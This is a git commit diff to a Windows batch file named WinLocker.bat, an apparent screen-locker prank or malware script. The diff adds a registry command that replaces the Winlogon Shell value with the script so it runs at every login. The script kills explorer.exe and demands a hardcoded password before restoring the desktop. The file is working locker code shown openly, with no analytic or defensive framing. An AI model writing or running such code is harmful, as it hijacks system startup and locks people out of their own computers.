0a90e24d1db3141ee2240788a2b182d23836690b
Artemon4ik8091 <104835550+Artemon4ik8091@users.noreply.github.com>
2022-11-10 21:32:01 +0300

    UPDATE

--- WinLocker.bat
+++ WinLocker.bat
@@ -1,14 +1,15 @@
 @echo off
 taskkill /im explorer.exe /f >nul
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "WinLocker.bat" /f
 color a
 
 
 echo Your Windows OC is locked
 echo Enter Password:
 
-:Ã°
+:ð
 set /p x=
-if %x%==123321 (echo Windows OC unlocked
+if %x%==123321 (echo Windows OC inlocked
 start explorer
 exit
 ) else (
